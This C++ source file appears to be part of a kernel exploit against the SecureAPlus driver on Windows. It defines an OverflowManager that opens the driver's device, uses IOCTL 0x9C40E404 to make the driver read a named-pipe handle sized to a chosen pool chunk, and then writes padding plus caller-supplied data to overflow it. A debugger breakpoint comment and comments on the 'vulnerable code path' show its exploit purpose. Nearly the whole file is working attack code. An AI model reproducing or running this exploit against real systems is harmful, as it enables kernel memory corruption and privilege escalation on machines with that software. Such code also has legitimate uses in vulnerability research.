#include "general.h"

//bp saappctl+0x02F454".if (qwo(@rbx + 4) == 0x6161616161616161) { dc rbx-4 L 50} .else { gc }"

OverflowManager::OverflowManager(HANDLE hDevice)
{
    driver = hDevice;
    overflowPrimed = false;
    irpReadyEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    irpFailedEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
}


void OverflowManager::PrimeOverflow(UINT64 tChunkSize) {
	DEBUG_PRINT(" [*] Priming overflow with chunk size: 0x%llx\n", tChunkSize);
    if (overflowPrimed)
    {
        DEBUG_PRINT(" [!] Overflow already primed!\n");
        return;
    }

    chunkSize = tChunkSize;
    LPCSTR pipeName = "\\\\.\\pipe\\testPipe";
    sPipe = NULL;
    if (irpReadyEvent) ResetEvent(irpReadyEvent);
    if (irpFailedEvent) ResetEvent(irpFailedEvent);

    securityAttributes = { 0 };
    securityDescriptor = NULL;

    ConvertStringSecurityDescriptorToSecurityDescriptorA("D:(A;;GA;;;WD)", SDDL_REVISION_1, &securityDescriptor, NULL);

    securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
    securityAttributes.bInheritHandle = FALSE;
    securityAttributes.lpSecurityDescriptor = securityDescriptor;

    sPipe = CreateNamedPipeA(pipeName, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 512, 512, 0, &securityAttributes);

    if (sPipe == INVALID_HANDLE_VALUE) {
        DEBUG_PRINT(" [!] Failed to create pipe. Error: %lu\n", GetLastError());
        LocalFree(securityDescriptor);
        return;
    }

    
    std::thread([](HANDLE pipe) {ConnectNamedPipe(pipe, NULL); }, sPipe).detach();
    irpThread = std::thread(&OverflowManager::SendIRP, this);

    if (irpReadyEvent && irpFailedEvent) {
        HANDLE waitHandles[] = { irpReadyEvent, irpFailedEvent };
        DWORD waitResult = WaitForMultipleObjects(2, waitHandles, FALSE, 2000);
        if (waitResult == WAIT_OBJECT_0 + 1) {
            DEBUG_PRINT(" [!] Overflow IRP worker failed to open pipe handle\n");
            DisconnectNamedPipe(sPipe);
            CloseHandle(sPipe);
            LocalFree(securityDescriptor);
            if (irpThread.joinable())
                irpThread.join();
            return;
        }
        else if (waitResult == WAIT_TIMEOUT) {
            DEBUG_PRINT(" [!] Timed out waiting for overflow IRP worker; continuing cautiously\n");
        }
    }

    overflowPrimed = true;
}

void OverflowManager::SendIRP()
{
    UINT32 status = 0;
    UINT32 offset = 0;

    WCHAR filePath[] = L"\\Device\\NamedPipe\\testPipe";

    UINT64 fileHandle = GetFileHandle(driver, filePath);
    if (fileHandle == 0 || fileHandle == (UINT64)-1 || fileHandle == 0x26) {
        if (irpFailedEvent) SetEvent(irpFailedEvent);
        return;
    }

    if (irpReadyEvent) SetEvent(irpReadyEvent);

    ReadFileHandle(driver, (HANDLE)fileHandle, CalculateIRPSize(chunkSize));

}


void OverflowManager::PassOverflow()
{
    if (!overflowPrimed)
    {
        DEBUG_PRINT(" [!] Overflow not primed!\n");
        return;
    }


    UINT64 totalPayloadSize = CalculateIRPSize(chunkSize) - 0x18;

    char* payload = new char[totalPayloadSize];


    memset(payload, 'A', totalPayloadSize);
    DWORD bytesWritten;

    if (WriteFile(sPipe, payload, totalPayloadSize, &bytesWritten, NULL))
        FlushFileBuffers(sPipe);

    DisconnectNamedPipe(sPipe);

    CloseHandle(sPipe);
    LocalFree(securityDescriptor);

    irpThread.join();
    overflowPrimed = false;
}


void OverflowManager::TriggerOverflow(BYTE* overflowData, UINT64 overflowSize)
{
    if (!overflowPrimed)
    {
        DEBUG_PRINT(" [!] Overflow not primed!\n");
        return;
    }

    UINT64 paddingSize = CalculateIRPSize(chunkSize) - 0x18;
	DEBUG_PRINT(" [*] Triggering overflow with payload size: 0x%llx (Padding: 0x%llx, Overflow: 0x%llx)\n", paddingSize + overflowSize, paddingSize, overflowSize);

    UINT64 totalPayloadSize = paddingSize + overflowSize;


    char* payload = new char[totalPayloadSize];

    for (UINT64 i = 0; i < paddingSize; i++)
        payload[i] = 'A';

    memcpy(payload + paddingSize, overflowData, overflowSize);
    DWORD bytesWritten;

	DEBUG_PRINT(" [*] Sending 0x%llx bytes of payload to driver...\n", totalPayloadSize);
    if (WriteFile(sPipe, payload, totalPayloadSize, &bytesWritten, NULL))
        FlushFileBuffers(sPipe);

    DisconnectNamedPipe(sPipe);

    CloseHandle(sPipe);
    LocalFree(securityDescriptor);  
    irpThread.join();

    overflowPrimed = false;
}



HANDLE GetDeviceHandle()
{
    HANDLE hDevice = CreateFileW(L"\\\\.\\SecureAPlus", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        DEBUG_PRINT(" [-] Failed to open device. Error: %lu\n", GetLastError());
        return NULL;
    }
    DEBUG_PRINT(" [+] Connected to driver successfully!\n");

    return hDevice;
}


UINT64 CalculateIRPSize(UINT64 chunkSize)
{
    return chunkSize - 0x50;
}




UINT64 GetFileHandle(HANDLE device, WCHAR* filePath)
{
    CreateFileMsg inputBuffer;
    DWORD bytesReturned = 0;


    if (sizeof(inputBuffer) < 0x29) // Buffer must be at least 0x29 bytes to reach the vulnerable code path in the driver
    {
        DEBUG_PRINT("[-] Buffer size is too small. Minimum required size is 0x29 bytes.\n");
        return NULL;
    }


    wcscpy_s(inputBuffer.fileName, 260, filePath);
    // Send request to driver
    BOOL status = DeviceIoControl(device, 0x9C40E404, &inputBuffer, sizeof(inputBuffer), &inputBuffer, sizeof(inputBuffer), &bytesReturned, NULL);


    if (inputBuffer.fileHandle == -1 || inputBuffer.fileHandle == 0x26) {
        DEBUG_PRINT(" [-] Failed. Driver Error Code: 0x%X\n", inputBuffer.errorCode);

        if (inputBuffer.errorCode == 2) DEBUG_PRINT(" -> ERROR_FILE_NOT_FOUND (Check path syntax)\n");
        if (inputBuffer.errorCode == 5) DEBUG_PRINT(" -> ERROR_ACCESS_DENIED (Check AccessMask)\n");
        if (inputBuffer.errorCode == 32) DEBUG_PRINT(" -> ERROR_SHARING_VIOLATION (Target file is locked)\n");
    }

    return inputBuffer.fileHandle;
}





void ReadFileHandle(HANDLE device, HANDLE fileHandle, UINT64 chunkSize)
{
    if (chunkSize < 0x29) // Buffer must be at least 0x29 bytes to reach the vulnerable code path in the driver
    {
        DEBUG_PRINT(" [!] Buffer size is too small. Minimum required size is 0x29 bytes.\n");
        return;
    }
    ReadFileMsg inputBuffer = { 0 };
    DWORD bytesReturned = 0;

    inputBuffer.opCode = 0xC;
    inputBuffer.fileHandle = (UINT64)fileHandle;
    memset(inputBuffer.buffer, 0x61, 1000); // Fill buffer with dummy data to ensure it is allocated in the driver

    UINT64* outputData = (UINT64*)VirtualAlloc(NULL, chunkSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DeviceIoControl(device, 0x9C40E404, &inputBuffer, chunkSize, outputData, chunkSize, &bytesReturned, NULL);
    return;
}



